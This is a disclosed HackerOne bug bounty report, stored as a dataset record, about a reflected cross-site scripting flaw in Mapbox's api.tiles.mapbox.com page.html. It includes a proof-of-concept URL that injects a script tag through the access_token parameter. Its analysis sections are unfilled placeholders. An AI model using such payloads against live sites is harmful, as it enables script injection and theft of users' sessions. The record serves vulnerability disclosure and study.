---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '135217'
original_report_id: '135217'
title: Reflected cross-site scripting (XSS) on api.tiles.mapbox.com
weakness: Cross-site Scripting (XSS) - Generic
team_handle: mapbox
created_at: '2016-04-28T16:02:16.168Z'
disclosed_at: '2016-06-01T22:41:25.261Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 25
tags:
- hackerone
- cross-site-scripting-xss-generic
---

# Reflected cross-site scripting (XSS) on api.tiles.mapbox.com

## Metadata

- HackerOne Report ID: 135217
- Weakness: Cross-site Scripting (XSS) - Generic
- Program: mapbox
- Disclosed At: 2016-06-01T22:41:25.261Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

There is a reflective XSS vulnerability in the access_token param found in the page.html at api.tiles.mapbox.com

A proof of concept link:
http://api.tiles.mapbox.com/v4/ctswebrequest.m4ga59jd/page.html?access_token=pk.eyJ1IjoiY3Rzd2VicmVxdWVzdCIsImEiOiJTb19VUHM0In0.muGg6tMDG4NOGrV4qQQ8yw.htaccess.aspx%27%3E%3Cscript%3Ealert%28document.domain%29%3C/script%3E#11/39.9168/-75.1595

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
